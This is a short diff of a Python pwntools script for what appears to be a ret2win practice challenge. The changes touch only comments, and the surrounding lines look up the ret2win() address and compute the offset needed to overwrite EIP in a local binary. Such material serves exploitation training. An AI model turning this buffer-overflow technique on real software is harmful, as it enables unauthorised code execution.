@@ -24,11 +24,11 @@ def exploit(binary_path):
     # Automatically close the process when the "with" block is exited
     with process(elf.path) as io:
 
-        # Get the address of the ret2win function
+        # Get the address of the ret2win() function
         ret2win_addr = elf.symbols["ret2win"]
         log.debug(f"The address of ret2win() is {hex(ret2win_addr)}")
 
-        # Get the offset by calling the find_offset function
+        # Get the offset by calling the find_offset() function
         offset = find_offset(binary_path)
         log.debug(f"The offset calculated to overwrite EIP is {offset} bytes")
 
